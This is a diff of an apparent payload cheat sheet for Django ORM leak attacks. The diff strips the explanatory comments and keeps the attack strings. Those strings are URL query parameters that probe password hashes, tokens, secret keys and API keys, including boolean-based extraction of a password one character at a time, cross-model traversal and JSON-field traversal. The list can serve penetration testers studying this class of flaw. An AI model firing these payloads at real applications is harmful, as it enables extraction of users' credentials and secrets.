@@ -1,13 +1,3 @@
-# ============================================================
-# ORM Leak — Django ORM
-# ============================================================
-
-# ---- Debug Mode SQL Dump ----
-# If DEBUG=True: full SQL query in error response
-# ?search=x' → triggers SQL error revealing query structure
-
-# ---- Field Name Guessing via __contains ----
-# Django filter parameters exposed in URL/query:
 ?username__contains=admin
 ?username__startswith=a
 ?username__endswith=.com
@@ -16,28 +6,21 @@
 ?role__exact=admin
 ?is_admin__exact=True
 
-# ---- Cross-Model Traversal ----
-# Expose related model fields via __ traversal:
 ?user__username=admin
 ?user__is_staff=True
 ?user__password__startswith=$2b$
 ?order__user__email__contains=target
 ?profile__role=admin
 
-# ---- Sensitive Field Enumeration ----
 ?password__isnull=False
 ?password__startswith=$
 ?token__isnull=False
 ?secret_key__contains=abc
 ?api_key__startswith=sk-
 
-# ---- Boolean-Based ORM Extraction ----
-# True: response changes (filter matches)
-# False: empty response or different count
 ?password__startswith=a → count=X?
 ?password__startswith=b → count=Y?
 
-# ---- ORM Filter Operators ----
 __exact
 __iexact
 __contains
@@ -58,7 +41,6 @@ __isnull
 __regex
 __iregex
 
-# ---- JSON Field Traversal (Django 3.1+) ----
 ?metadata__role=admin
 ?config__debug=true
 ?settings__api_key__startswith=sk-
